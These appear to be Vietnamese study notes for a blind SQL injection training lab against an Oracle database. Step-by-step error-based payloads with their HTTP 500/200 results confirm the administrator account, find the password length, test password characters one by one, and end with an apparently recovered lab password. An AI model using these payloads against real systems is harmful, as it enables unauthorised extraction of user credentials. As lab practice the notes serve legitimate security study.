- ' -> 500
- '' -> 200
(TrackId= 'xyz''' nếu viết 1 cái thì bị lỗi do thừa, còn 2 cái thì nó kết thành 2 cái kiểu chuỗi nối với nhau ý, nên nó ko lỗi nữa)

- ' || (SELECT '') ||' -> 500
- ' || (SELECT '' FROM dual) ||' -> Oracle vì bị bắt chỉ rõ tên bảng
(`dual` là một bảng đặc biệt trong Oracle, thường dùng cho các truy vấn không cần truy cập dữ liệu thực tế)

- ' || (SELECT '' FROM dualdbajdsh) ||' -> Thử đổi tên bảng thì lỗi 500, vậy...
- ' || (SELECT '' FROM users) ||' -> 500
- ' || (SELECT '' FROM users WHERE ROWNUM = 1) ||' 
(điều kiện `ROWNUM = 1` phải có vì để ghép chuỗi thì chỉ có thể lấy dữ liệu 1 dòng, nếu nhiều dòng thì không thể ghép nên mới gây ra lỗi 500 như trên)

- '|| (SELECT '' FROM users WHERE username = 'administrator') ||' -> 200

- ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||' -> 500
- ' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||' -> 200

- '|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||' -> 500, tương tự thôi, để kiểm tra xem administrator có tồn tại hay không

- ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) = 20) ||'
Check độ dài pass thì là 20

- ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND SUBSTRING(password,1,1) = 'a') ||'

' || (SELECT CASE WHEN SUBSTRING(password,1,1) = 'a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'

Sai ở SUBSTRING nhé, dùng SUBSTR() với Oracle nè.

- Xong đẩy lên Intruder: 

![alt text](image-1.png)

zh6rauox597khm8eumjx
